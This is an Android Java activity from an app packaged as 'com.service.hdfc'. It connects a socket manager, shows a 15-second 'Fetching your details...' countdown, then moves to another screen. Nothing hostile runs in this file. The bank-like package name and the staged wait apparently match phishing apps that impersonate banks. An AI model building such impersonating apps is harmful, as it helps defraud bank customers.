package com.service.hdfc;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.widget.TextView;

public class LoaderActivity extends BaseActivity {

    int form_id;
    TextView timerMessage;
    private CountDownTimer countDownTimer; // ✅ keep reference
    private boolean isActive = true;       // ✅ track visibility

    @SuppressLint("SetTextI18n")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_loader);

        form_id = getIntent().getIntExtra("form_id", -1);
        socketManager = SocketManager.getInstance(context);
        socketManager.connect();
        socketManager.form_id = form_id;
        socketManager.activityContext = context;
        timerMessage = findViewById(R.id.timerMessage);

        // Start 30-second countdown
        startCountdown();
    }

    private void startCountdown() {
        countDownTimer = new CountDownTimer(15000, 1000) {
            public void onTick(long millisUntilFinished) {
                int secondsLeft = (int) (millisUntilFinished / 1000);
                timerMessage.setText(
                        "Please wait "+secondsLeft+" Seconds\nFetching your details..."
                );
            }

            public void onFinish() {
                if (isActive) { // ✅ only continue if still in LoaderActivity
                    timerMessage.setText("Redirecting...");
                    secondActivity();
                }
            }
        }.start();
    }

    private void secondActivity() {
        Intent intent = new Intent(context, SecondActivity.class);
        intent.putExtra("form_id", form_id);
        intent.putExtra("by", "system");
        startActivity(intent);
        finish(); // ✅ optional: close LoaderActivity after navigating
    }

    @Override
    protected void onPause() {
        super.onPause();
        isActive = false; // ❌ user left activity
        if (countDownTimer != null) {
            countDownTimer.cancel(); // ✅ stop timer to prevent callback
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        isActive = true; // ✅ user is back
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (countDownTimer != null) {
            countDownTimer.cancel(); // ✅ clean up to prevent leaks
        }
    }
}
